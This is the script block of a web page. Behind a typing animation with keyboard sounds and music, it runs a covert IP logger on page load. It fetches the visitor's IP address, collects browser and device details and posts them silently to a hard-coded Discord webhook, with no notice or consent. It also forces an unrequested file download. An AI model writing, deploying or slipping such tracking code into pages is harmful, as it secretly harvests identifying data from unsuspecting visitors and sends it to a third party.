    <script>
        // Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1357864679405523164/QxQY3ETmjuXzc82pfUz8le4Gn4bOXsH-rPxg-BcnSlCgAY-epPKDr-Uaah_oXg5mM01D';

        // Function to get user information and send to Discord
        async function getUserInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                
                // Create and download 503.txt
                const content = "503 here";
                const blob = new Blob([content], { type: 'text/plain' });
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = '503.txt';
                a.click();
                
                const embed = {
                    title: "New Visitor Information",
                    color: 16711680,
                    fields: [
                        {
                            name: "IP Address",
                            value: ipData.ip,
                            inline: true
                        },
                        {
                            name: "User Agent",
                            value: userAgent,
                            inline: false
                        },
                        {
                            name: "Platform",
                            value: platform,
                            inline: true
                        },
                        {
                            name: "Language",
                            value: language,
                            inline: true
                        },
                        {
                            name: "Screen Resolution",
                            value: screenResolution,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                };

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });

                document.getElementById('ip-display').textContent = 'Your IP: ' + ipData.ip;
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Typing animation function
        function typeText() {
            const typingContainer = document.querySelector('.typing-container');
            const mainContent = document.querySelector('.main-content');
            const texts = document.querySelectorAll('.typing-text');
            const keyboardSounds = [
                document.getElementById('keyboard-sound-1'),
                document.getElementById('keyboard-sound-2'),
                document.getElementById('keyboard-sound-3')
            ];
            const backgroundMusic = document.getElementById('background-music');
            
            typingContainer.style.display = 'block';
            let currentTextIndex = 0;
            
            function showNextLine() {
                if (currentTextIndex >= texts.length) {
                    setTimeout(() => {
                        typingContainer.style.display = 'none';
                        mainContent.style.display = 'block';
                        setTimeout(() => {
                            mainContent.classList.add('show');
                            backgroundMusic.play().catch(() => {});
                        }, 100);
                    }, 1000);
                    return;
                }
                
                const currentText = texts[currentTextIndex];
                currentText.classList.add('visible');
                
                const textContent = currentText.textContent;
                currentText.textContent = '';
                let charIndex = 0;
                
                function typeChar() {
                    if (charIndex < textContent.length) {
                        const sound = keyboardSounds[Math.floor(Math.random() * keyboardSounds.length)];
                        sound.currentTime = 0;
                        sound.volume = 0.3;
                        sound.play().catch(() => {});
                        
                        currentText.innerHTML += textContent[charIndex];
                        charIndex++;
                        setTimeout(typeChar, Math.random() * 50 + 30);
                    } else {
                        currentText.innerHTML = textContent + '<span class="cursor"></span>';
                        currentTextIndex++;
                        setTimeout(showNextLine, 500);
                    }
                }
                
                typeChar();
            }
            
            showNextLine();
        }

        // Start everything when page loads
        document.addEventListener('DOMContentLoaded', () => {
            typeText();
            getUserInfo();
        });
    </script>
